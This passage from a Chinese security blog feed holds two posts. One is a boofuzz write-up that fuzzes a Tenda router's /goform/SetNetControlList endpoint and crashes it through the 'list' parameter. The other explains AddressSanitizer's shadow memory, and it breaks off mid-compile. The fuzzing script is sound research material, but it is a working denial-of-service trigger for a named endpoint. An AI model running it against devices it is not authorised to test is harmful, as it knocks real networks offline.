class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> boofuzz import *<br><br><br>def main():<br>    host = <span class="hljs-string">&#x27;192.168.0.1&#x27;</span><br>   <span class="hljs-built_in"> port </span>= 80<br>    <br>    # 设置<span class="hljs-built_in"> logging </span>配置<br>    csv_log = open(<span class="hljs-string">&#x27;fuzz_results.csv&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>) #python3要设置字符串，byte会报错<br>    my_logger = [FuzzLoggerCsv(<span class="hljs-attribute">file_handle</span>=csv_log)] #将日志写入csv文件<br><br>    session = Session(<br>        <span class="hljs-attribute">target</span>=Target(<br>            <span class="hljs-attribute">connection</span>=SocketConnection(host,port,proto=&#x27;tcp&#x27;),<br>        ),<br>        <span class="hljs-attribute">receive_data_after_fuzz</span>=<span class="hljs-literal">True</span>,#接受程序返回的数据<br>        <span class="hljs-attribute">ignore_connection_reset</span>=<span class="hljs-literal">True</span>,<br>        <span class="hljs-attribute">restart_sleep_time</span>=10,<br>        <span class="hljs-attribute">crash_threshold_element</span>=1,#会停止在第一次crash的地方<br>        <span class="hljs-attribute">fuzz_loggers</span>=my_logger,<br>    )<br>    <br>    s_initialize(<span class="hljs-string">&quot;Request&quot;</span>)<br>    #line1<br>    s_static(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Method&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-1-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;/goform/SetNetControlList&quot;</span>) #漏洞存在接口<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-1-2&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;HTTP/1.1&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;HTTP_VERSION&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-1&quot;</span>)<br>    #line2<br>    s_static(<span class="hljs-string">&quot;Host:&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-2-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;192.168.0.1&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;IP_ADDRESS&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-2&quot;</span>)<br>    #line3<br>    s_static(<span class="hljs-string">&quot;Content-Length:&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Content-Length&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-3-1&quot;</span>)<br>    s_size(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-attribute">output_format</span>=<span class="hljs-string">&#x27;ascii&#x27;</span>,fuzzable=False)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-3&quot;</span>)<br>    #line4<br>    s_static(<span class="hljs-string">&quot;Accept:&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-4-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;*/*&quot;</span>,<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-4&quot;</span>)<br>    #line5<br>    s_static(<span class="hljs-string">&quot;X-Requested-With:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;X-Requested-With&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-5-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;X-Requested-With-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-5&quot;</span>)<br>    #line6<br>    s_static(<span class="hljs-string">&quot;User-Agent:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;User-Agent&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-6-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;User-Agent-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-6&quot;</span>)<br>    #line7<br>    s_static(<span class="hljs-string">&quot;Content-Type:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Content-Type&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-7-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Content-Type-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-7&quot;</span>)<br>    #line8<br>    s_static(<span class="hljs-string">&quot;Origin:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Origin&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-8-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;http://192.168.0.1&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Origin-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-8&quot;</span>)<br>    #line9<br>    s_static(<span class="hljs-string">&quot;Referer:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Referer&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-9-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;http://192.168.0.1/wireless_ssid.html?random=0.7532778770368576&amp;&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Referer-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-9&quot;</span>)<br>    #line10<br>    s_static(<span class="hljs-string">&quot;Accept-Encoding:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Encoding&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-10-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Encoding-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-10&quot;</span>)<br>    #line11<br>    s_static(<span class="hljs-string">&quot;Accept-Language:&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Language&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-11-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;en-US,en;q=0.9&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Accept-Language-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-11&quot;</span>)<br>    #line12<br>    s_static(<span class="hljs-string">&quot;Connection:&quot;</span>)<br>    s_static(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;space-12-1&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Connection-value&quot;</span>)<br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Request-Line-CRLF-12&quot;</span>)<br><br>    s_static(<span class="hljs-string">&quot;\r\n&quot;</span>)<br>    #important key!!<br>    with s_block(<span class="hljs-string">&#x27;data&#x27;</span>):<br>        # line14<br>        s_group(<span class="hljs-string">&quot;key1&quot;</span>,[<span class="hljs-string">&#x27;mac&#x27;</span>,<span class="hljs-string">&#x27;list&#x27;</span>,<span class="hljs-string">&#x27;ssid&#x27;</span>]) #危险参数，其中有一个参数能造成栈溢出<br>        s_static(<span class="hljs-string">&quot;=&quot;</span>)<br>        s_string(<span class="hljs-string">&quot;korey0sh1&quot;</span>, <span class="hljs-attribute">max_len</span>=0x1000,fuzzable=True)<br><br><br>    session.connect(s_get(<span class="hljs-string">&quot;Request&quot;</span>))<br>    session.fuzz()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>具体怎么写框架笔者就不赘述了</p><p>在我指定漏洞位置（&#x2F;goform&#x2F;SetNetControlList）和危险参数的情况下，boofuzz效率确实还行，大概一分钟就跑出来了</p><p>可以看到在第1524个case DoS了</p><p><img src="/img/Fuzz1/0.png" alt="img"></p><p>那说明1523个case发生了什么</p><p><img src="/img/Fuzz1/1.png" alt="img"></p><p>很好，list参数造成了crash</p><p>笔者一开始还很兴奋，毕竟与AFL++的Qemu mode相比，boofuzz在fuzz Iot中无论是效率还是自由度高的不是一点半点，但是这是笔者定位好了漏洞所在位置的情况下。因为之前几个礼拜笔者对Tenda AX3小挖了一手，对历史漏洞自然是能很快的定位。但是，如果面对一个新设备，不同的功能函数接口有几十个，且不同功能对应的参数也不同，这时fuzz的效率就很令人质疑。</p><p>于是笔者便设置了3组group，每组group中设置了5个参数，将上面利用过的漏洞放入其中，类似</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lisp">s_group(<span class="hljs-string">&quot;url&quot;</span>,[&#x27;url1&#x27;,&#x27;url2&#x27;,&#x27;url3&#x27;,&#x27;url4&#x27;,&#x27;url5&#x27;])<br>s_group(<span class="hljs-string">&quot;key1&quot;</span>,[arg1&#x27;,&#x27;arg2&#x27;,&#x27;arg3&#x27;,&#x27;arg4&#x27;,&#x27;arg5&#x27;]) <br>s_static(<span class="hljs-string">&quot;=&quot;</span>)<br>s_string(<span class="hljs-string">&quot;korey0sh1&quot;</span>, max_len=0x1000,fuzzable=True)<br>s_static(<span class="hljs-string">&quot;&amp;&quot;</span>)<br>s_group(<span class="hljs-string">&quot;key2&quot;</span>,[&#x27;arg1&#x27;,&#x27;arg2&#x27;,&#x27;arg3&#x27;,&#x27;arg4&#x27;,&#x27;arg5&#x27;])<br>s_static(<span class="hljs-string">&quot;=&quot;</span>)<br>s_string(<span class="hljs-string">&quot;korey0sh1&quot;</span>, max_len=0x1000,fuzzable=True)<br></code></pre></td></tr></table></figure><p>但不幸的是，跑了5、6个小时，快100万条case，还是没跑出来</p><p>且就算跑出crash，也只是大致漏洞定位，具体的poc还是得人工仔细审。</p><h1 id="0x2-一些怨气碎碎念"><a href="#0x2-一些怨气碎碎念" class="headerlink" title="0x2: 一些怨气碎碎念"></a>0x2: 一些怨气碎碎念</h1><h2 id="神奇的callback"><a href="#神奇的callback" class="headerlink" title="神奇的callback"></a>神奇的callback</h2><p>因为发现DoS后py程序并不能停止，还是会不停尝试连接，于是便抄了一个callback板子根据http的回显来判断服务是否停止</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cmake">def check_response(<span class="hljs-keyword">target</span>, fuzz_data_logger, session, *args, **kwargs):<br>    <span class="hljs-comment"># callback</span><br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;Checking this response...&quot;</span>)<br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;We will receive 512 bytes data...&quot;</span>)<br>    try:<br>        response = <span class="hljs-keyword">target</span>.recv(<span class="hljs-number">512</span>)<br>    except:<br>        fuzz_data_logger.log_fail(<span class="hljs-string">&quot;Unable to connect to target. Closing...&quot;</span>)<br>        <span class="hljs-keyword">target</span>.close()              <span class="hljs-comment"># close this target (fuzzer&#x27;s thread)</span><br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-comment"># if empty response</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>        fuzz_data_logger.log_fail(<span class="hljs-string">&quot;Empty response, target may be hung. Closing...&quot;</span>)<br>        <span class="hljs-keyword">target</span>.close()<br>        <span class="hljs-keyword">return</span><br>    fuzz_data_logger.log_info(<span class="hljs-string">&quot;response check...\n&quot;</span> + response.decode())<br>    <span class="hljs-keyword">target</span>.close()<br>    <span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p>结果发现我POST都没发送呢你先执行callback了，于是乎整个程序在case 1就直接down掉了</p><p><img src="/img/Fuzz1/3.png" alt="img"></p><p>我是SB，我真nm是SB，😝——&gt;🤡</p><p>原来我以为callback是放session.connect里的，结果要放到session里就好了，我真TM是个SB啊</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">session.connect(s_get(<span class="hljs-string">&quot;Request&quot;</span>),<span class="hljs-attribute">callback</span>=check_response)<br>                          |<br>                          |<br>                          |<br>                         \ /<br>session = Session(<br>        <span class="hljs-attribute">target</span>=Target(<br>            <span class="hljs-attribute">connection</span>=SocketConnection(host,port,proto=&#x27;tcp&#x27;),<br>        ),<br>        post_test_case_callbacks=[check_response],<br>        <span class="hljs-attribute">receive_data_after_fuzz</span>=<span class="hljs-literal">False</span>,  #这个一定要关掉，不然callback那个recv就会出问题<br>        <span class="hljs-attribute">ignore_connection_reset</span>=<span class="hljs-literal">True</span>,<br>        <span class="hljs-attribute">restart_sleep_time</span>=10,<br>        <span class="hljs-attribute">crash_threshold_element</span>=1,<br>    )<br></code></pre></td></tr></table></figure><h2 id="神奇的monitor"><a href="#神奇的monitor" class="headerlink" title="神奇的monitor"></a>神奇的monitor</h2><p>boofuzz 只提供了三种 monitor：</p><p>ProcessMonitor 大概是和 Procman 进行 rpc 通讯来监控；</p><p>NetworkMonitor 具体用法不太清楚，看文档里说用了 wireshark，ubuntu没装wireshark，hai</p><p>CallbackMonitor 是默认的 Monitor，提供回调函数的功能，就是前面哪个callback</p><p>然后笔者试了process monitor，结果跑不起来一点，后来一想process monitor也不怎么重要，实在不行用gdbserver拿case一跑就行了</p><h2 id="神奇的log"><a href="#神奇的log" class="headerlink" title="神奇的log"></a>神奇的log</h2><p>想把每个case都写进文件，到时候打exp拿payload会方便。结果问gpt全是错的，后来总算找到了一个把log写进.csv文件的方法</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">session = Session(<br>        <span class="hljs-attribute">target</span>=Target(<br>            <span class="hljs-attribute">connection</span>=SocketConnection(host,port,proto=&#x27;tcp&#x27;),<br>        ),<br>        post_test_case_callbacks=[check_response],<br>        <span class="hljs-attribute">receive_data_after_fuzz</span>=<span class="hljs-literal">False</span>,<br>        <span class="hljs-attribute">ignore_connection_reset</span>=<span class="hljs-literal">True</span>,<br>        <span class="hljs-attribute">restart_sleep_time</span>=10,<br>        <span class="hljs-attribute">crash_threshold_element</span>=1,<br>        <span class="hljs-attribute">fuzz_loggers</span>=my_logger<br>    )<br></code></pre></td></tr></table></figure><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>对于某些要先登录的设备，可以这么写</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>))     # 默认前置节点为<span class="hljs-selector-tag">root</span><br><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>), <span class="hljs-built_in">s_get</span>(action1&#x27;), callback=add_auth_callback)<br><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>),<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;action2&#x27;</span>), callback=add_auth_callback)<br><span class="hljs-selector-tag">session</span><span class="hljs-selector-class">.connect</span>(<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;login&#x27;</span>),<span class="hljs-built_in">s_get</span>(<span class="hljs-string">&#x27;action3&#x27;</span>), callback=add_auth_callback)<br></code></pre></td></tr></table></figure><h1 id="0x3-最后的最后"><a href="#0x3-最后的最后" class="headerlink" title="0x3: 最后的最后"></a>0x3: 最后的最后</h1><p>有失望，或许吧，开始学Iot的时候一直想寻找一个能全自动化固件模拟，漏洞分析的工具，然而，想想就有点不太现实（但Shambles这东西感兴趣的师傅可以了解下，铸币笔者因为实在太穷不是很了解，但感觉很diao的样子，md快6位数一年的费用想想就恐怖）。</p><p>现在我可能会倾向于用FirmAE、fat、fap这些模拟一遍然后再用qemu进行手动验证吧，当然有真机能实操那就太棒了。</p><p>扯远了，前几天觉得AFL对这些闭源的固件用处不是很大，现在看来boofuzz的作用也有限，😂</p><p>可能过几天会看看FirmAFL，好像手上还有一篇对应论文来着。</p><p>翻出来了三个月前想入门Iot时和Iot界的传说的聊天记录</p><p><img src="/img/Fuzz1/0.jpg" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz、Iot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Address Sanitizer(投毒？投毒！)</title>
    <link href="/2023/08/06/ASAN/"/>
    <url>/2023/08/06/ASAN/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0: 写在所有之前"></a>0x0: 写在所有之前</h1><p>笔者在Fuzz101项目中，遇到了ASAN（Address Sanitizer）这个内存错误检测工具，感觉挺巧妙的。</p><p>这边就浅浅的记录一下</p><h1 id="0x1-What-is-it"><a href="#0x1-What-is-it" class="headerlink" title="0x1: What is it?"></a>0x1: What is it?</h1><p>ASAN（Address Sanitizer）是google开发的一个针对C&#x2F;C++的高效率的内存错误检测工具</p><p>它可以检测以下类型的漏洞</p><ul><li>stack buffer overflow</li><li>heap buffer overflow</li><li>global buffer overflow</li><li>use after free</li><li>use after return</li><li>use after scope</li><li>memory leak</li><li>initialization order bugs</li></ul><p>同时，ASAN还支持x86、x68_64、mips、arm、powerpc等多种架构</p><p>可以说，好用的一批</p><h2 id="那它是怎么做到的嘞"><a href="#那它是怎么做到的嘞" class="headerlink" title="那它是怎么做到的嘞"></a>那它是怎么做到的嘞</h2><p>因为是内存检测工具，所以要做到全面的检查，就要对每次的内存读&#x2F;写及其他操作进行监测</p><p>笔者刚开始的时候觉得ASAN可能是canary保护的plusplus版本，后来才知道ASAN通过一个编译器检测模块和一个劫持内存操作函数（例如malloc&#x2F;free）的run-time库来对内存进行监测。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Before:</span><br><span class="hljs-keyword"></span>*<span class="hljs-keyword">address </span>= ...<span class="hljs-comment">;  // or: ... = *address;</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">After:</span><br>if (IsPoisoned(<span class="hljs-keyword">address)) </span>&#123;<br>  ReportError(<span class="hljs-keyword">address, </span>kAccessSize, kIsWrite);<br>&#125;<br>*<span class="hljs-keyword">address </span>= ...<span class="hljs-comment">;  // or: ... = *address;</span><br></code></pre></td></tr></table></figure><h3 id="Shadow-Memory"><a href="#Shadow-Memory" class="headerlink" title="Shadow Memory"></a>Shadow Memory</h3><p>影子内存，位于虚拟地址空间的中间（因为堆栈在两头）,是用来记录主程序的内存是否可用的内存区域，这是ASAN的特有产物。</p><p>主程序的内存按照8字节对齐，而8个字节在影子内存中对应的区域为一个字节，所以主程序内存 ：影子内存&#x3D;8 ：1。</p><p>影子内存无法在主程序中被读写，只有通过编译器相关代码才可访问</p><p>在每次对内存进行读写操作时，都会读取对应的影子内存检查其合法性</p><p>影子内存的计算公式如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">64</span>-bit<br>Shadow = (Mem &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7fff8000</span><span class="hljs-comment">;</span><br><br>[<span class="hljs-number">0x10007fff8000</span>, <span class="hljs-number">0x7fffffffffff</span>]HighMem<br>[<span class="hljs-number">0x02008fff7000</span>, <span class="hljs-number">0x10007fff7fff</span>]HighShadow<br>[<span class="hljs-number">0x00008fff7000</span>, <span class="hljs-number">0x02008fff6fff</span>]ShadowGap<br>[<span class="hljs-number">0x00007fff8000</span>, <span class="hljs-number">0x00008fff6fff</span>]LowShadow<br>[<span class="hljs-number">0x000000000000</span>, <span class="hljs-number">0x00007fff7fff</span>]LowMem<br><br><span class="hljs-number">32</span>-bit<br>Shadow = (Mem &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x20000000</span><span class="hljs-comment">;</span><br><br>[<span class="hljs-number">0x40000000</span>, <span class="hljs-number">0xffffffff</span>]HighMem<br>[<span class="hljs-number">0x28000000</span>, <span class="hljs-number">0x3fffffff</span>]HighShadow<br>[<span class="hljs-number">0x24000000</span>, <span class="hljs-number">0x27ffffff</span>]ShadowGap<br>[<span class="hljs-number">0x20000000</span>, <span class="hljs-number">0x23ffffff</span>]LowShadow<br>[<span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x1fffffff</span>]LowMem<br><br>ultra compact shadow<br>Shadow = (Mem &gt;&gt; <span class="hljs-number">7</span>) | kOffset<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="Sanitizer-投毒"><a href="#Sanitizer-投毒" class="headerlink" title="Sanitizer 投毒"></a>Sanitizer 投毒</h3><p>我觉得可能用大家都玩过的游戏——<strong>扫雷</strong>进行类比，会更好理解。</p><p>如果我们想要标记一个区域已经被使用，那么就在这块内存对应的Shadow Memory埋雷，一旦再次对此区域进行读写操作，就会触发那颗“雷“，从而造成crash。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">shadow_address </span>= MemToShadow(<span class="hljs-keyword">address);</span><br><span class="hljs-keyword"></span>if (<span class="hljs-keyword">ShadowIsPoisoned(shadow_address)) </span>&#123;<br>  ReportError(<span class="hljs-keyword">address, </span>kAccessSize, kIsWrite);<br>&#125;<br></code></pre></td></tr></table></figure><p>当然，这只是举个例子。不同的漏洞所对应的<strong>”扫雷“</strong>策略也不同。</p><p>每个影子内存对应的可能值有9个：</p><ul><li>当其对应的内存8个字节都未被投毒，value&#x3D;0</li><li>当其对应的内存8个字节都被投毒，value&#x3D;负数</li><li>当其对应得内存有k个字节被投毒，value&#x3D;8-k</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">byte</span> *shadow_address = <span class="hljs-built_in">MemToShadow</span>(address);<br><span class="hljs-type">byte</span> shadow_value = *shadow_address;<br><span class="hljs-keyword">if</span> (shadow_value) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">SlowPathCheck</span>(shadow_value, address, kAccessSize)) &#123;<br>    <span class="hljs-built_in">ReportError</span>(address, kAccessSize, kIsWrite);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// Check the cases where we access first k bytes of the qword</span><br><span class="hljs-comment">// and these k bytes are unpoisoned.</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SlowPathCheck</span><span class="hljs-params">(shadow_value, address, kAccessSize)</span> </span>&#123;<br>  last_accessed_byte = (address &amp; <span class="hljs-number">7</span>) + kAccessSize - <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> (last_accessed_byte &gt;= shadow_value);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Report-Error"><a href="#Report-Error" class="headerlink" title="Report Error"></a>Report Error</h3><p><code>ReportError</code> 可以被实现为一个调用（这是默认方式），但还有一些其他稍微更有效率和&#x2F;或更紧凑的解决方案。在某个时候，默认行为是：</p><p>将失败地址复制到 %rax（%eax）。<br>执行 ud2 指令（生成 SIGILL 信号）。<br>在 ud2 后的一个字节指令中编码访问类型和大小。总体上，这三条指令需要 5-6 字节的字节码。<br>也可以只使用单个指令（例如 ud2），但这将需要在运行时库中拥有一个完整的反汇编器（或其他一些技巧）。</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>通过IDA进行分析可以很直观的看到ASAN的行为</p><p>小写一个demo</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> stack1[<span class="hljs-number">0x10</span>];<br>  <br>  <span class="hljs-keyword">return</span> stack1[<span class="hljs-number">0x10</span>];<br>&#125;<br>  <br></code></pre></td></tr></table></figure><p>编译</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">gcc -g -fsanitize=address ./stack.c -o 